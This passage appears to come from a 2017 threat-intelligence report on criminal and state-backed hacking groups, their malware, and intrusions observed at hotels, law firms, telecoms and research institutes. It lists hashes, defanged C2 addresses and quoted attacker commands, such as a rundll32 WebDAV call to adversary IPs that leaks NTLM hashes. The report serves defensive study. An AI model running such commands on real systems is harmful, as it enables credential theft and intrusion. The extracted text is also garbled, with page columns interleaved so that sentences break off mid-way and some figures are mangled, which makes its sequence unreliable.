Asia. Targeting is consistent with the economic\ninterests of Vietnam.\n\n\n-----\n\n###### 42 43\n\n Findings Part 1\n EVOLVING\n\n Mineware and the Rising Value\n mineware on customer networks. of Cryptocurrencies\n\nWIZARD SPIDER was not the only adversary\n\nFalcon Intelligence continues to monitor to target cryptocurrencies in this dramatically\ncryptocurrency trends and their effects on bullish cryptocurrency marketplace.\nthe eCrime ecosystem.

It is likely\nthat MONTY SPIDER already has distinct\nexisting relationships with WIZARD SPIDER\nand DUNGEON SPIDER, but a liaison would\nhave been required to pull off this level of\nspamming efficiency.\n\n- MONTY SPIDER may be infecting by\n\ngeolocation to maximize their payouts. It\nis likely WIZARD SPIDER and DUNGEON\nSPIDER pay different amounts based on IP\ngeolocation.\n\nappeared to be experimenting and perfecting\ndelivery mechanisms. However, in the latter\nhalf of 2017, Dridex spamming appeared to\ndecrease, suggesting this adversary has shifted\nto a more targeted approach. The malware\nhas the capability to use keyword searching\non victim machines to assist the adversary in\nidentifying financial software, a tactic that may\nhelp pinpoint opportunities to transact highvalue fraud.\n\nThroughout 2017, Falcon Intelligence also\ntracked the spread of Android banking Trojans,\nas well as the evolution of this threat in terms of\nsophistication. Many Android banking Trojans\nuse screen overlay web injection and SMS\ninterception to compromise online mobile\nbanking. Some other Trojans feature webinjects\nfor other applications, such as Uber, and social\nmedia sites. Increases in the global smartphone\nuser base, and in the subset of those users who\nemploy the devices to access sensitive data\n(such as bank accounts or payment services),\n\n\n**Hancitor**\n\n**Quant Loader**\n\n**Smoke Loader**\n\n**Godzilla Loader**\n\n**ARS VBS**\n\n\nOn the market since 2013, this loader has seen a resurgence of activity\nsince late 2016. In 2017, it supported Zloader and Panda Zeus (BAMBOO\nSPIDER) banking Trojan operations.\n\nDeveloped by malware-as-a-service group GURU SPIDER, this malware\nhas seen regular updates throughout the year, up to v.1.54+ on December\n11, 2017. During a testing period in April 2017, INDRIK SPIDER used Quant\nLoader as well as Godzilla.\n\nThis modular crimeware, which is often used as a loader, has received\nregular updates throughout 2017. Recent improvements include an Email\nGrabber module, additional support to the Form Grabber module, and\nan update for the Hidden TV module. This loader has been observed\ndelivering TrickBot, suggesting at least some portion of WIZARD SPIDER\naffiliates are customers.\n\nShortly after promising the release of version 1.7 in March 2017, the\ndeveloper and this loader disappeared from underground forums. As\nof early December, the malware has reappeared, with the developer\npromising version 1.7 in early 2018.\n\nIn mid-December 2017, a Russian eCrime threat actor introduced\nARS VBS. According to Falcon Intelligence sensitive sources, it sold\nnumerous copies in just over five days, and has received numerous\npositive reviews from satisfied customers. This newcomer has yet to\nacquire significant market share, but early success suggests it is a\nproduct of at least moderate quality.\n\n\n**MUMMY SPIDER:**\n**From Banking Trojan**\n**to Pay-Per-Install Service**\nIn July 2017, Falcon Intelligence identified a\nnew trend in Emotet malware, developed\nby MUMMY SPIDER. Emotet (aka Geodo)\ndownloads four plugins, one of which is a\nspam plugin, presumably used in conjunction\nwith the collection of victim email credentials\nand Microsoft Outlook address books. Unlike\nprevious campaigns, in mid-2017 MUMMY\nSPIDER did not always push their own banking\nTrojan module through this spam capability.\nInstead, CrowdStrike observed Emotet\n\n\ndownloading other Trojans, including QakBot\nand Dridex, suggesting MUMMY SPIDER\nwas starting a pay-per-install loader service\navailable to other criminal groups.\n\nIn the following months, CrowdStrike tracked\nthis adversary’s continued efforts to evade\ndetection, including changing the RSA key\nduring regular C2 updates. MUMMY SPIDER\nlaunched regular mass spam distribution\ncampaigns to increase the rate of infection for\nEmotet, thus raising the number of potential\nvictims for other crimeware.\n\n\n-----\n\n###### 46 47\n\n\nare key drivers of growth in the Android\nmalware scene.

Likewise, this malware has\ndistributed TrickBot, using unique gtags that are prefixed\nby \"mom\". It is possible the actor behind this malware has a\nrelationship with MUMMY SPIDER, WIZARD SPIDER, or both.\n\n\nAfter an extended hiatus, CoreBot appeared briefly in May\n**BOSON SPIDER** Low\n2017.\n\n\n**Threat** **Ops Tempo** **Description**\n\n\n**Table 11**\nSummary of Banking\nTrojan Activity - 2017\n\n\n###### Rise of TrickBot\n\nActivity from WIZARD SPIDER was steady\nin the beginning of 2017, with the speed of\ndevelopment changing significantly at the\nbeginning of June 2017. The rate of development\nincreased in June and July, averaging from a\nnew version every week to issuing a new release\nevery workday during the second half of August.\nAlthough there was some lag in sustaining this\npace in the fall, WIZARD SPIDER continues to\nmake regular updates to TrickBot targeting.\n\nEarly in the existence of this operation, TrickBot\ncapabilities remained unsophisticated but well\ndeveloped, relying on webinject functionality.\nOutside of this core banking Trojan capability,\nWIZARD SPIDER developed modules for Virtual\nNetwork Computing (VNC), collection of victim\nmachine information, and a mail searcher\nmodule. From late July through September,\nWIZARD SPIDER significantly increased the\nbotnet capability of TrickBot by adding these\nnew modules:\n\n- wormDll — SMB spreader\n\n- outlookDll — Harvests victim data from MS\n\nOutlook\n\n- importDll — Information stealer targeting\n\nbrowsers\n\n- testWormDLL — Monero cryptocurrency\n\nminer\n\n- shareDLL — Lateral movement around victim\n\nnetwork, via shares victim has access to\n\nTrickBot has code similarities with the nowdefunct Dyre operation.

However, in the latter half of the year, INDRIK SPIDER\nchanged its modus operandi to conduct fewer, more\ntargeted campaigns.\n\nCriminal operators have used the Cutwail spambot, as well as\nRIG and Nebula exploit kits, to distribute this banking Trojan.\nDevelopers and operators of this malware have updated\nconfiguration files to improve targeting and expanded target\nlists for the video capture capability in March and April 2017.\n\nThe Cutwail spambot has sustained Nymaim campaigns\nthroughout 2017. The most commonly observed campaigns\nwere written in Polish and used common spam themes like\n“parcel delivery” or “refund owed.”\n\nIn February 2017, CrowdStrike observed some instances of\nthis malware being distributed by the now-defunct spam\nbotnet Kelihos. Affiliates regularly distributed this threat via\nCutwail, using multiple spam email themes.\n\nThis Trojan has been distributed since 2009, but it suddenly\nceased operating in September 2016. This threat re-emerged\nin March 2017, and in May it was distributed by Emotet.\n\n\nhas largely been attributed to Russian law\nenforcement action in November of that year.\nSome of the initial URL patterns included in\nTrickBot configuration files were previously\nobserved in Dyre, and technical analysis has\nfurther shown that TrickBot code design and\ncommunication protocols are remarkably similar\nto those of Dyre. However, it appears the code\nwas written from scratch. WIZARD SPIDER may\nhave employed a developer who worked for the\nDyre group, or the code for Dyre malware was\nsold to another criminal group and used as a\nfoundation to build a new, successful banking\nTrojan.\n\nAnalysis of TrickBot development and campaign\ndata demonstrates that WIZARD SPIDER is\nrun in a businesslike manner, operating within\nstandard business hours and potentially\nassigning individuals to specific tasks, such as\ndevelopment and infrastructure management.\nAdditionally, it is suspected that WIZARD\nSPIDER has been able to increase the skill set\nof the TrickBot development team by either\nbringing in new developers or using periods of\ninactivity to concentrate on development of new\ncapabilities.\n\nWIZARD SPIDER is the core development and\noperating group behind the TrickBot malware,\nbut there are affiliates of this group that operate\ndistinct variants designated by identifiers called\n“group tags” (gtags). It is not yet known how each\naffiliate is operated, but it is highly likely that they\nare run either by operators within the WIZARD\nSPIDER group, or by criminal individuals with\nclose ties to WIZARD SPIDER.\n\n\n-----\n\n###### 48 49\n\n\n###### Banking Trojans 2018 Outlook 2017 was a period of increasing tempo and well-calculated decision making from WIZARD SPIDER. This pace has most recently been matched\n by BAMBOO SPIDER in the latter part of 2017, possibly in an attempt to contend in a competitive marketplace dominated by more sophisticated operations. Falcon Intelligence continues to investigate the extent of\n recent INDRIK SPIDER operations to determine whether this adversary\n is significantly changing TTPs.\n\n Many banking Trojans, such as Gozi ISFB and GootKit, are operated by affiliates who have acquired a variant of the malware. Groups behind these campaigns are likely small, not highly sophisticated, and not necessarily well resourced. Some individual actors may be focused regionally, as was observed in the Polish-language Nymaim campaigns.\n\n Targeted eCrime\n\n\n###### CARBON SPIDER: Pattern of Testing Exploit Documents\n\nCARBON SPIDER’s toolkit includes both opensource and custom malware. Open-source\ntools include the Metasploit framework for\noperations against machines within the target\nnetwork, customized variants of TinyMet (a tiny\nmeterpreter stager) for deploying payloads\nduring lateral movement, and variants of\nMimiKatz for dumping user credentials.\nCustom-built malware families that are uniquely\nassociated with CARBON SPIDER are the firststage implant Agent ORM (aka Toshliph), a fullfledged backdoor tool for long-term persistence\ncalled Agent Sekur (aka Anunak), and first-stage\ntools VB Flash and JS Flash RATs.\n\nSince at least May 2017, CARBON SPIDER has\nmaintained a relatively consistent development\ncycle of introducing a significant evolution to\nthe delivery document, followed by a period\nof testing and refinement. Malicious RTF\nand DOC files now leverage embedded OLE\n\n\ntracked by CrowdStrike as SKELETON SPIDER,\nalso known publicly as FIN6. Based on this\nactor’s use of code signing certificates from\na Moscow-based company, language IDs\n\n\nin malware samples, and the use of Russian\ndomain registrars, it is suspected with medium\nconfidence that this actor is based in Russia.\n\n\n**Table 12**\nTargeted eCrime\n\nAdversaries\nObserved in 2017\n\n\nThis adversary has focused on PoS compromise of restaurant\n**CARBON SPIDER** High\nchains in the U.S.\n\n\n**Threat** **Ops Tempo** **Description**\n\n\n**COBALT SPIDER** Medium/High\n\n**SKELETON SPIDER** Medium/Low\n\n\nFalcon Intelligence observed COBALT SPIDER quickly\nassimilating new exploits into its operations over the course\nof 2017, including CVE-2017-0262, CVE-2017-0199, CVE-20178759 and CVE-2017-11882.\n\nRecent operations feature an updated version of the original\nFrameworkPoS malware, which was first reported by\nCrowdStrike in 2014.\n\n\nobjects (.lnk and .cmd) to launch processes that\nextract and deploy their payloads. CARBON\nSPIDER’s first-stage tool VB Flash, which was\ndeveloped entirely in Visual Basic Script and\nused throughout 2016, has been re-developed\ninto a version that runs using JavaScript, dubbed\nJS Flash. This version not only contains the\nprevious VB Flash capabilities, but also includes\nnew methods of obfuscation, a new C2 protocol\nand some additional capabilities.\n\nCARBON SPIDER continues to leverage these\ntools to target the U.S. hospitality sector,\nwith a shifting focus from hotel chains to\nrestaurants. CARBON SPIDER spear-phishing\nemails typically use subject lines that reference\ncustomer details, invoices or payment\ninformation for a booking. The body of the email\nthen explains that this information is contained\nwithin a document attached to the email, with\ninstructions on how to unlock the protected\ndocument. The emails are usually directed to\ncustomer-facing personnel within the victim\norganization, and open-source reporting has\n\n\nTargeted eCrime groups use TTPs more\ncommonly associated with targeted intrusion\nespionage campaigns. Such techniques include\nspear phishing, extensive reconnaissance and\nlateral movement within a victim network.\nInstead of state secrets, these adversaries are\nfrequently looking for data to monetize — often\ncredit card numbers or access to financial\naccounts. In 2017, the most active targeted\neCrime adversary observed by CrowdStrike was\nCARBON SPIDER, although this assessment of\nthe actor’s operational tempo may be partially\ndue to the method by which this adversary\ntested its tools and exploit documents\nthroughout most of the year (as noted in the\nfollowing).\n\nCOBALT SPIDER, an actor group that has\n\n\nprimarily focused on financial sector targets\nin Russia and Eastern Europe, also launched\nspear-phishing campaigns in 2017, making quick\nuse of available vulnerabilities, native Windows\nOS capabilities and publicly available tools such\nas Cobalt Strike. This adversary has monetized\nattacks by targeting ATMs and issuing\ncommands to dispense cash (a technique\ntermed “Jackpotting”), which is collected by a\nnetwork of mule operatives who work as part of\nthe campaign team.\n\nIn December 2017, Falcon Intelligence provided\nsupport for an active incident response\nengagement involving malware known as\nFrameworkPoS, used for stealing credit card\ntrack data from PoS devices. FrameworkPoS\nis probably exclusively used by an actor\n\n\n-----\n\n###### 50 51\n\n\ndocumented that quite often these emails will\nbe followed by telephone conversations to\nenable successful exploitation.\n\nThe primary objective of these operations is to\ncapture large dumps of PoS credit card data.\nCARBON SPIDER is thought to be responsible\nfor the 2016 hack against the Oracle MICROS\nPoS system, widely used by retail and\nhospitality companies. There is growing\nevidence to suggest the actor has used the\ninformation gleaned from this attack to target\nspecific businesses that operate these systems,\nwhich would support the choice of targets\nobserved in recent months.\n\n\nFrom June through October 2017, CARBON\nSPIDER testing of new exploit delivery\ndocuments was observed almost daily for\nminor configuration edits, with new code\ndevelopments released monthly. In November\n2017, however, the length of time between\nobserved testing activity began to increase,\nsuggesting the adversary may have taken this\ntesting in-house — most likely in an attempt\nto reduce exposure of its TTPs to security\nresearchers. Regardless, new samples of\nAgent Sekur were identified in December 2017,\nevidence that this adversary remains active.\nFalcon Intelligence expects CARBON SPIDER to\ncontinue to target U.S.-based businesses in 2018.\n\n\nfor half the infected machines, and 12 BTC for all\ninfected machines in the victim’s network. The\nnew demand is 1.5 BTC for a single machine,\n4.5 BTC for half the infected machines, and 9\nBTC for all infected machines. The reduced BTC\n\n\ndemand is likely due to the recent USD value\nincrease of BTC and means that these payments\nare now significantly higher in value, although\nthe lower BTC amounts likely appear more\nappealing to victims.\n\n\n###### 2018 Outlook\n\n\n###### CARBON SPIDER CARBON SPIDER’s phased development and deployment cycle has proven very profitable, and it is expected that it will continue to target U.S.-based businesses in the fast-food and hospitality sectors. The group remains focused on exploiting PoS terminals, and both sectors (as well as retail) have very high volumes of PoS usage. There is no expectation that this adversary will target banks or the financial sector at this time, although this was previously in their target scope (ca. 2016).\n\n Overall, credit card data will continue to be profitable. SKELETON SPIDER, as well as other similarly styled operations, will monetize this data by selling it on a per-card basis in darknet carding shops. U.S.-based businesses that have not adopted the latest chip-and-PIN technology will continue to be the most heavily targeted victims of this kind of operation. Likewise, a wider adoption of chip-and-PIN technology could change the operational TTPs or geographic targeting of these groups.\n\n COBALT SPIDER appears to have the resources for acquiring and developing software or exploits, possibly relying on builders obtained from other developers and sold on underground forums. They will almost certainly continue to evolve in the new year and further broaden their target scope. Falcon Intelligence expects COBALT SPIDER to continue to use spear phishing to target banks, particularly in regions where this has already proved profitable for this adversary.\n\n\n###### Some of the targeting profile and TTPs of COBALT SPIDER are similar to those of CARBON SPIDER. Both groups make use of open-source and penetration testing tools, with spear phishing being a primary mode of delivery. Although both adversaries have targeted banks in Eastern Europe and Central Asia, these entities remain the primary targeting profile for COBALT SPIDER, a stark distinction from CARBON SPIDER, which has broadened its scope over the last two years. Despite these similarities, Falcon Intelligence has observed no infrastructure overlap between these groups, and they have each incorporated exploits into their operations at different times. CARBON SPIDER is more closely associated with custom toolkits, whereas COBALT SPIDER is also known as “Cobalt Gang” because of its use of the Cobalt Strike tool in its operations.\n\n\n###### Comparison:  CARBON SPIDER vs. COBALT SPIDER\n\n\n**Samas Ransomware**\nSamas operators usually compromise internetfacing services such as vulnerable JBoss\ninstallations in targeted organizations, and\nuse lateral movement tools to install their\nransomware on multiple machines; thus, this\nactor group is considered to be a targeted\neCrime adversary. The operators of Samas\nransomware stayed out of the headlines in 2017,\nand Falcon Intelligence has only identified two\n\n\npossibly successful campaigns — one in April\n2017 and another in October 2017.\n\nThe ransom demands from Samas infections\nare generally some of the highest among active\nransomware families, and a decline in observed\nactivity may be attributed to the rising value of\nBitcoin. Samples recovered in October featured\na lower ransom demand. The previous ransom\ndemand was 1.7 BTC for a single machine, 6 BTC\n\n\n-----\n\n###### 52 53\n\n Findings Part 1\n HACKTIVISM Introduction\n\n 2018 Hacktivism \n Large-scale, international hacktivist campaigns from Anonymous were notably Outlook\n The growing tension of regional issues will likely continue to pull in\n subdued in 2017.

The adversary delivered a file named\nHotel_Reservation_Form.doc (SHA256 hash\na4a455db9f297e2b9fe99d63c9d31e827efb­\n2cda65be445625fa64f4fce7f797), a malicious\n\nPhishing Lure\n\nDrops\n\nExecuted Via\n\nThe first exported function of the DLL was then\ninvoked via Windows Management Instrumen­\ntation (WMI), dropping a DownRange DLL:\n\n\nWord document that used macros to decode a\nBase64 encoded DLL from XML data:\n\nFILE: C:\\Users\\4546479\\AppData\\Roaming\\\nuser.dat\nHASH: 58b223f74992f371cab8f1df7c03b9b­\n66f2ea9e3c9e22122898a9be62a05c0b4\n\n\nhash 51eaf3b30c1ea932843cb9f5b6fb­\n41804976d94a53a507ccb292b8392276cfd6)\nwas also seen being used to launch the implant.\nThe domains mvband[.]net and mvtband[.]net\nwere configured as C2. DownRange is a firststage tool that is uniquely attributed to FANCY\nBEAR. As OverWatch observed throughout 2017,\nphishing remains a favored tactic to maliciously\ngain access to target networks, not only among\nBEAR groups, but for several nation-state actors.\n\n\n###### Global Hospitality Chain Suffers Concurrent Intrusions from\n Multiple Adversaries\n\nTechniques Observed\n\n- Privilege Escalation: Valid Accounts, Bypass\n\nUser Account Control\n\n- Credential Access: Create Account,\n\n\n**Figure 9**\nSequence of\nEvents in FANCY\nBEAR Phishing\nAttack Against\nInternational Hotel\nChain\n\n\nCredential Dumping\n\n- Discovery: File and Directory Discovery,\n\nNetwork Share Discovery\n\n- Lateral Movement: Remote Services\n\n- Execution: PowerShell, Rundll32, Command\n\n\nLine Interface\n\n- Command and Control: Standard\n\nCryptographic Protocol, Custom\nCryptographic Protocol\n\n\nsoftware. They used TeamViewer to not only\ndeploy their own implants, but also to install\nlegitimate Ammyy Admin and Supremo remote\ndesktop software. When attackers are able to\ndeploy legitimate remote administration tools,\nthey often are able to maintain a foothold within\nthe network without drawing the attention\nthat malware may trigger. Another popular\ntactic noted during this set of activities was\nemploying the eventvwr.exe UAC bypass for\nprivilege escalation.[2]\n\nIn July, a hotel employee opened a hotel\nreservation-themed phishing lure, resulting\nin an AppLocker bypass attack, which\nconnected to a file hosted on an external\nserver associated with Cobalt Strike activity.\nImmediately following the bypass attack,\nExcel was spawned as a service and launched\nrundll32.exe, which further spawned several\nmalicious child processes, including basic\nreconnaissance commands and PowerSploit.\nSpecifically, the unknown SPIDER actors\nleveraged the PowerSploit Get-GPPPassword\nmodule[3] for credential theft.\n\n\nIn August, a KITTEN adversary directly\naccessed two of the hotel chain’s servers using\nexisting credentials. Using a version of the\nSysInternals PsExec tool to run a command\nshell, the actors installed a service with the\nname Microsoft Proxy Service. That service\nused a custom build of the Plink Secure Shell\n(SSH) client from the PuTTY suite to create a\ncompressed and encrypted SSH tunnel to a\nsubdomain of win7-update[.]com, forwarding\nthe remote port 3389 to 8516 on the local\nhost. This tunnel could then be used by the\nactor to access the internal network. The\nFalcon Intelligence team’s analysis of the C2\ninfrastructure revealed extensive overlaps with\nknown HELIX KITTEN implants. Furthermore,\nthe Plink version used in this attack was a\ncustom build, seen only in another HELIX\nKITTEN intrusion targeting a technology sector\ncompany focused on travel services. Such\nbehavior demonstrates the growing scope and\n\n\n1 https://technet.\n\nmicrosoft.com/\n\n\nen-us/library/\n\ncc754243(v=ws.11).\n\n\naspx\n\n2 https://enigma0x3.\n\n\nnet/2016/08/15/\n\nfileless-uac-bypass\n\nusing-eventvwr\nexe-and-registry\n\nDuring 2017, one hotel chain network, by itself,\ndrew wide interest among adversaries targeting\nthe sector. The following intrusion events,\nattributed to various SPIDER, KITTEN, and BEAR\nactors, were observed targeting this single\nhospitality organization:\n\nEarly in the year, OverWatch discovered\nartifacts associated with the Agent ORM\nimplant used by CARBON SPIDER. Other likely\nCARBON SPIDER artifacts observed as part\nof intrusion activity included FRAMEPKG.exe\n(seen with multiple hash values), a modified\nversion of PsExec used as utility malware.\nFRAMEPKG.exe was used extensively to conduct\nreconnaissance and access sensitive data\nservers, including credit card databases. A\nnotable tactic was the use of CmdKey[1] to add\nmore users to facilitate persistence. Likely\nmotivated by financial gain, OverWatch has\nobserved similar CARBON SPIDER activity at\nseveral customers in the hospitality and other\nvertical industries.\n\n\nFILE: C:\\Users\\4546479\\AppData\\Roaming\\\nmvtband.dat\nHASH: 8c47961181d9929333628af20bdd­\n750021e925f40065374e6b876e3b8afbba57\n\nAnother dropped file, mrset.bat (SHA256\n\n\nhijacking/\n\n3 https://github.com/\n\n\nPowerShellMafia/\n\nPowerSploit/blob/\n\n\nmaster/Exfiltration/\n\nGet-GPPPassword.ps1\n\n\nOver the following months, OverWatch saw\nfurther likely CARBON SPIDER behavior on the\nvictim network. Malicious actors repeatedly\ngained access via compromised credentials\nand then installed legitimate TeamViewer\n\n\n-----\n\n###### 62 63\n\n\ncapability of actors assessed to be associated\nwith Iranian operations.\n\nOverWatch also learned that potential FAN­\nCY BEAR actors had been active on this\nvictim’s network. In particular, tools used\nby FANCY BEAR seen on a portion of the\ncustomer’s network included the RemCom\nremote administration tool (SHA256 3c2fe­\n308c0a563e06263bbacf793bbe9b2259d795f­\ncc36b953793a7e499e7f71). Though RemCom\nis a known open-source remote command\n\n\nexecution tool that can by used by network\nadministrators, CrowdStrike has repeatedly\nseen FANCY BEAR employ it in other targeted\nintrusions. In this case, the victim confirmed\nthat RemCom was not being used by legiti­\nmate administrators, but by probable FANCY\nBEAR actors within their network. FANCY BEAR\npresence on the network would be consistent\nwith their suspected interests as noted above,\nspecifically global hotel organizations that\nrepresent a valuable target to facilitate tracking\nand monitoring of people of interest.\n\n\n4 https://technet.\n\nmicrosoft.com/\n\nen-us/library/\n\ncc731033(v=ws.11).aspx\n\n5 https://github.com/\n\nzlocal/PowerShell\nGitHub-Shell\n\n6 https://technet.\n\nmicrosoft.com/\n\nen-us/library/\n\n\n###### Intrusion Campaign\n Against Legal Sector Uses PowerShell-GitHub-Shell\n\nTechniques Observed\n\n- Privilege Escalation: Exploitation of\n\nVulnerability\n\n- Defense Evasion: File Deletion\n\n- Discovery: System Information Discovery,\n\nSystem Network Configuration Discovery\n\n- Execution: PowerShell\n\n- Command and Control: Web Service\n\nIn June 2017, OverWatch uncovered an intrusion\ncampaign targeting the legal sector. The\nmalicious activity began with the exploitation\nof vulnerable or misconfigured Microsoft SQL\nservers, which were used as staging points for\nmalicious command execution. After conducting\nbasic reconnaissance with commands such\nas whoami and ipconfig, the actors used\nPowerShell to download and run a file from the\ncode hosting service GitHub. This payload was a\nfirst-stage, open-source backdoor known as the\nPowerShell-GitHub-Shell,[5] which functions as a\nremote shell, receiving tasking and submitting\nthe output back to a GitHub page.\n\nIn at least one case, the adversary later used\nthe initial backdoor to install and deploy a\nsecond-stage implant, HanaRAT, from IP address\n80.83.118[.]248. The associated install files\nwere initially downloaded as .txt files and then\nconverted to .exe and .dll files using certutil.[6]\nThe actors were also intent on cleaning up\nafterwards, deleting all .txt, .exe and .dll files\nfrom their staging directory (%TEMP%).\n\n\nThe identified copy of HanaRAT was deployed\nfrom a dropper named mpsvc.dll\n(SHA256 hash: a144825a4aa74a50f9e8dcb7ea­\nb0e5dfa1f708471d8bc097f08e683c50fd3738)\nthat was side-loaded by a legitimate copy of a\nMicrosoft Malware Protection executable named\nMsMpEng.exe (SHA256 hash: 11f55350ef­\n5219b132a1e04c8bf8a521089f62d7207d40f7f­\n3c6e8b6e04090a1). The core HanaRAT malware\n(SHA256 hash:\n5dcf3080a9268c7c846430b313c1e9f4fd9caf­\n80c0fbaefb9ef562bd9014b220) exists only in\nmemory after being initialized by the dropper.\n\nPartnership between the Falcon Intelligence\nand OverWatch teams revealed this same\nmalicious behavior impacting at least eight\nvictims in the legal services sector. The identified\ntargets were primarily headquartered in the U.S.,\nalthough many maintain international offices, as\nwell. The use of GitHub as a first-stage control\ninfrastructure is a tactic observed among\nmultiple tracked adversaries, as it provides the\nactor with an initial layer of operational security\nand obfuscation. The observed behavior led\nFalcon Intelligence to assess this series of\nattacks against the legal sector as a continuation\nof a campaign initially targeting technology\nsector entities. Based on initial attribution of the\naforementioned campaign, the actor conducting\nthis attack is suspected of being supported by\nWICKED PANDA.\n\n\n-----\n\n###### 64 65\n\n\n###### Growing Tensions Between U.S., DPRK Coincide with Higher Rate\n of CHOLLIMA Activity\n\nTechniques Observed\n\n- Persistence: New Service\n\n- Defense Evasion: Masquerading\n\n- Discovery: System Information Discovery,\n\nSystem Network Configuration Discovery,\nFile and Directory Discovery\n\n- Command and Control\n\nConsistent with reporting trends across the\ncommunity, OverWatch saw an increase in\nthreat activity attributed to North Korea in 2017.\nFor example, in mid-May, STARDUST CHOLLIMA\nactors exploited a web-facing SMB server\nbelonging to a high-profile research institution\nlocated in the U.S. They leveraged access to\ninstall the following malicious DLL:\n\nFILE: C:\\Windows\\System32\\sqlsvc32.dll\nHASH: c18f39829759ffd0f51f­\nb2224a57469e16e7bb542ec31ab94be1cf­\n8222f7a23d\n\nThe DLL is an implant that was executed with\nthe following command line to run as a service:\n\nC:\\Windows\\system32\\svchost.exe -k SQLMgnt\n\nC2 communications were observed, IP\naddress 220.241.29[.]138 and the domain\nonlineshoppingmole[.]epac[.]to. The malware\nis a variant of TwoPence’s XorDNS component.\nTwoPence is an implant framework that includes\ncomponents taken from a shared source code\nrepository known to be leveraged by STARDUST\nCHOLLIMA, assessed as a state-sponsored\nNorth Korean adversary focused on financiallymotivated eCrime. The DNS XOR component\nitself has been used in previous actor tools\nof varying types, including keyloggers and\nRDP brute-forcing tools. CrowdStrike has only\nobserved STARDUST CHOLLIMA use the\nTwoPence malware family.\n\nIn August, OverWatch identified a spearphishing attack targeting English-speaking\nusers in the Asia-Pacific region using a\nmalicious, macro-enabled document named\nJob Description.doc. When the victim opened\n\n\nIn the Saudi Heart Association attack,\nobserved commands connecting to adversary\ninfrastructure were highly similar. For example:\n\nrundll32.exe C:\\WINDOWS\\system32\\\ndavclnt.dll,DavSetCookie 188.165.187[.]235\nhttp://188.165.187[.]235/file.gif\n\nThese types of connections could potentially\nexpose internal NTLM hashes to the attacker for\ncollection, and potential offline cracking for future\nreuse. Falcon Intelligence attributed the SWC\nactivity affecting energy and critical infrastructure\norganizations to the Russia-based actor BERSERK\nBEAR. However, the SWC campaign related\nto the Saudi Heart Association website has\nsuspected links to KITTEN actors, as the target\nset would be consistent with Iranian interests.\n\n###### Suspected PANDA Actor Harvests Call Data from Telecom Provider\n\nTechniques Observed\n\n- Persistence: New Service\n\n- Defense Evasion: Timestomp\n\n- Credential Access: Brute Force, Account\n\nManipulation\n\n- Discovery: System Network Configuration\n\nDiscovery, System Network Connections\nDiscovery, Network Service Scanning\n\n- Lateral Movement: Remote Services\n\n- Execution: Command-Line Interface, Scripting\n\n- Collection: Automated Collection, Data from\n\nLocal System\n\n- Exfiltration: Automated Exfiltration\n\n- Command and Control: Connection Proxy\n\nOverWatch identified PANDA adversaries\nexploiting telecommunications companies in\nSoutheast Asia throughout 2017. In one such\nintrusion, OverWatch discovered that actors had\ncompromised an internal Linux host and were\nusing it as their primary staging point for hosting\na wide array of malicious tools to enable further\npenetration throughout the victim’s network.\n\nObserved activity on the machine included telnet\nchecks to allow SMB, RDP, SSH and TCP port\n5050 listening on multiple internal IPs. They used\ncurl to download from, or test connectivity with,\nvictim web hosts. A re-compiled version of the\nport scanner Pscan was used against multiple\n\n\nthe malicious Word attachment, it dropped an\nEnglish-language decoy document containing\njob description text for a “Director of Compliance\nManagement” role. In addition to the decoy\ndocument, the following implant file was written\nto disk and executed:\n\nFile: C:\\Users\\<REDACTED>\\AppData\\Local\\\nTemp\\csc.exe\nHash: a4a2e47161bbf5f6c1d5b1b3fba26a19db­\nfcdcf4eb575b56bde05c674089ae95\n\nFalcon Intelligence identified the file as a Hawup\nRAT binary attributed to LABYRINTH CHOLLIMA,\nan adversary believed to conduct espionage\noperations in support of DPRK intelligence\nrequirements. Once executed, the RAT called\nout to the following C2 IP addresses waiting for\na response:\n\n64.86.34[.]24\n41.131.29[.]59\n176.35.250[.]93\n\nAfter lying dormant for almost three full days,\nthe adversary answered the call and ran an initial\n“ver” command. This is often seen as the first\ncommand actors execute after gaining access\nto an exploited machine, as it gives information\non the running operating system. The malware\nwas then copied to the startup folder as dwm.\nexe for persistence. OverWatch then observed\nadditional reconnaissance commands, including\nipconfig, net user, net use, and dir. At that point,\nthe victim responded by quarantining the host,\npreventing further adversary actions on the\ncompromised machine.\n\nThe content of the decoy document appeared\nto be taken from a legitimate job description\nposting. This activity aligned with concurrent\nindustry reporting on an ongoing campaign by\nDPRK actors leveraging English-language Word\ndocuments purporting to be job descriptions for\nU.S. defense contractors. Given the job-related\nlure themes, this targeting likely was part of a\nspecific focus on targeting contractors working\nin the Asia-Pacific region.\n\n\n###### Suspected KITTEN Attacks\n Target Middle East Organizations\n\nTechniques Observed\n\n- Privilege Escalation: Exploitation of\n\nVulnerability\n\n- Credential Access: Input Capture\n\n- Execution: Rundll32\n\n- Command and Control\n\nSimilar to the increase in CHOLLIMA attacks in\n2017, OverWatch also identified more suspected\nKITTEN adversary attacks during the year. In July,\nan employee at a Middle East petrochemical\ncompany was targeted by a spear-phishing email\ncontaining a malicious link to the following URL.\n\nhttp://vpsupdate[.]tk/list[.]zip\n\nThanks to the Falcon sensor running on the\nvictim’s host, the malware did not successfully\ninfect the host. The tactics and target in this\nevent were consistent with KITTEN behavior.\nThe malicious link at the time was hosted at IP\naddress 51.255.24[.]88. According to Falcon\nIntelligence, that IP address is known to be HELIX\nKITTEN infrastructure, used before as C2 for their\nHelminth implant.\n\nLater, in September, OverWatch observed a\nstrategic web compromise (SWC) impact several\nvictims in a wide range of industry verticals.\nThe Saudi Heart Association website (ksacpr.\norg[.]sa) was compromised to redirect visitors\nto the malicious domain adobe-plugin[.]bid,\nthen hosted at IP address 188.165.187[.]235.\nRedirected victims would automatically attempt\nto remotely authenticate to the adversarycontrolled external server’s SMB share.\n\nFalcon data showed that communication to the\nmalicious infrastructure resulted in activity very\nsimilar to what was observed during an SWC\noperation targeting North American energy\nand critical infrastructure sectors earlier in\n2017. Commands observed in that attack were\nformatted as follows:\n\nrundll32.exe C:\\WINDOWS\\system32\\\ndavclnt.dll,DavSetCookie 184.154.150[.]66\nhttp://184.154.150[.]66/ame_icon.png\n\n\n-----\n\n###### 66 67\n\n\n8\n\n7\n\n\ninternal IPs, as was smbclient, leveraging\nmultiple domain accounts to enumerate hosts.\nThe adversary also employed THC Hydra,[7]\na tool used to brute-force crack a remote\nauthentication service. The actors moved\nlaterally using SSH, in addition to modifying and\n“timestomping” SSH private key files.\n\nDuring one of the malicious SSH sessions,\nOverWatch saw the installation of a service\nnamed hci0 from a RPM package. Further\ninvestigation revealed it to be a build of the\nopen-source xsocks proxy server.[8] Additional\nanalysis of the compromised Linux host also\ndiscovered daily scripted routing to harvest\ndata from a customer database. Exfiltrated\ndata included SMS and call data records,\nfacilitated by use of a tool named sxx, which was\na 